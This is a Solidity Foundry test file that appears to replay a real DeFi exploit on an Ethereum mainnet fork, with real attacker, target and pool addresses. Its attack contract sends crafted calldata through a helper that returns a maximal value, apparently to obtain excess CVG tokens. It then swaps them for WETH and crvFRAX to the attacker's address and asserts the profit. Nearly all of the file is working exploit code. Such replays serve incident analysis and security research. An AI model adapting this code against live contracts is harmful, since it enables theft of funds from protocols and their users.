
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 20434449;
    uint256 constant TX_TIMESTAMP = 1722524387;
    uint256 constant TX_BLOCK_NUMBER = 20434450;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        _installRuntime();
        OurAttack attack = OurAttack(payable(ATTACK_CONTRACT));
        _etchHelpers();
        attack.bindHelper(Addresses.attack_helper);
        _expectOutcome(address(attack), Addresses.attack_helper);
        _snapProfit();
        _logBalances("Before exploit");
        attack.executeSetup{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _etchHelpers() internal {
        vm.etch(Addresses.attack_helper, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper);
        _hydrateAttackHelper();
    }

    function _hydrateAttackHelper() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_helper,
                bytes32(uint256(0)),
                bytes32(uint256(115792089237316195423570985008687907853269984665640519780783186698350374013825))
            );
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(
            Addresses.attacker_eoa, address(0), Addresses.crvFRAX, "crvFRAX", 15925234299672041310152
        );
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.WETH, "WETH", 60058285738671884767);
    }
}

contract OurAttack {



    AttackerHelper public helper;

    constructor() payable {
        _ctorBootstrap();
    }

    function _ctorBootstrap() internal {
        helper = AttackerHelper(payable(Addresses.attack_helper));
    }

    function executeSetup() external payable {
        if (address(helper) == address(0)) _ctorBootstrap();
        _setup();
    }

    function _setup() public {
        {
            address created = Addresses.attack_helper;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper))._helper();
        {
            bytes memory replayCallData =
                hex"2344665200000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000ee45384d4861b6fb422dfa03fbdcc6e29d7beb69000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000100000000000000000000000074840edc21fab546f0fc085869862a3137f48e1b";
            (bool ok,) = Addresses.A_2B083B_7606.call(replayCallData);
            require(ok, "replay selector 0x23446652 failed");
        }
        IERC20Like(Addresses.CVG).balanceOf(address(this));
        uint256 cvgApproveAllowance = 52846555551136309714066648;
        IERC20Like(Addresses.CVG).approve(Addresses.CVGETH, cvgApproveAllowance);
        ICVGETH(Addresses.CVGETH).exchange(1, 0, 52846555551136309714066648, 0, Addresses.attacker_eoa);
        uint256 cvgApproveAllowance_2 = 5871839505681812190451850;
        IERC20Like(Addresses.CVG).approve(Addresses.Vyper_contract_A7B0E9, cvgApproveAllowance_2);
        IVyper_contract_A7B0E9(Addresses.Vyper_contract_A7B0E9)
            .exchange(0, 1, 5871839505681812190451850, 0, false, Addresses.attacker_eoa);
        IERC20Like(Addresses.WETH).balanceOf(address(this));
        IERC20Like(Addresses.crvFRAX).balanceOf(address(this));
        IERC20Like(Addresses.CVG).balanceOf(address(this));
    }

    receive() external payable {}

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    function bindHelper(address attackHelper) external {
        helper = AttackerHelper(payable(attackHelper));
    }

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }
}

contract AttackerHelper {
    receive() external payable {}

    fallback() external payable {
        if (msg.sig == 0x011f20bf) {
            bytes memory ret = abi.encode(
                uint256(115792089237316195423570985008687907853269984665640519780783186698350374013825),
                uint256(64),
                uint256(0)
            );
            assembly { return(add(ret, 32), mload(ret)) }
        }
        _entryCb();
    }

    function callback() external payable {
        bytes memory ret = abi.encode(
            uint256(115792089237316195423570985008687907853269984665640519780783186698350374013825),
            uint256(64),
            uint256(0)
        );
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function _entryCb() internal {}

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _callback() internal {
        _markCallback(0);
    }

    function _helper() public {}
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct AttackCall {
    address target;
    bytes data;
}

interface VmExt {
    function store(address target, bytes32 slot, bytes32 value) external;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant CVGETH = 0x004C167d27ADa24305b76D80762997Fa6EB8d9B2;
    address internal constant attacker_eoa = 0x03560A9D7A2c391FB1A087C33650037ae30dE3aA;
    address internal constant A_2B083B_7606 = 0x2b083beaaC310CC5E190B1d2507038CcB03E7606;
    address internal constant crvFRAX = 0x3175Df0976dFA876431C2E9eE6Bc45b65d3473CC;
    address internal constant attack_helper = 0x74840EdC21fab546f0fc085869862a3137f48E1B;
    address internal constant CVG = 0x97efFB790f2fbB701D88f89DB4521348A2B77be8;
    address internal constant Vyper_contract_A7B0E9 = 0xa7B0E924c2dBB9B4F576CCE96ac80657E42c3e42;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant attack_contract = 0xee45384d4861b6fB422dFa03FbDCc6e29d7bEB69;
}

interface ICVGETH {
    function exchange(uint256, uint256, uint256, uint256, address) external returns (uint256);
}

interface IVyper_contract_A7B0E9 {
    function exchange(uint256, uint256, uint256, uint256, bool, address) external returns (uint256);
}

library Harness {
    function vmExt() internal pure returns (VmExt) {
        return VmExt(address(uint160(uint256(keccak256("hevm cheat code")))));
    }

    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
